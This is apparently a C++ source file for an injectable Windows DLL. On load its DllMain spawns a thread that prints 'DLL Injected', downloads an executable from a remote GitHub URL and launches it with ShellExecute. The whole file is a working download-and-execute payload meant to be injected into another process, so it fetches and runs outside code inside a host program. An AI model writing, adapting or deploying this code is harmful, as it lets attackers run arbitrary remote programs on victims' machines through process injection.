#include <Windows.h>
#include <iostream>
#include "../file_downloader/file_downloader.h"

void start( ) {
	printf_s( "DLL Injected\n" );

	if ( !n_file_downloader::download_file( "http://github.com/SilentProjects/executing_files_from_dll/raw/master/Release/file.exe" ) )
		MessageBoxA( 0, "download failed", "effd", MB_OK );

	ShellExecute( 0, "open", "file.exe", 0, 0, SW_SHOWNORMAL );
}

BOOL WINAPI DllMain( _In_ HINSTANCE instance, _In_ DWORD reason, _In_ LPVOID reserved ) {
	if ( reason == DLL_PROCESS_ATTACH ) {
		if ( auto handle = CreateThread( 0, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>( start ), 0, 0, 0 ) )
			CloseHandle( handle );
	}

	return TRUE;
}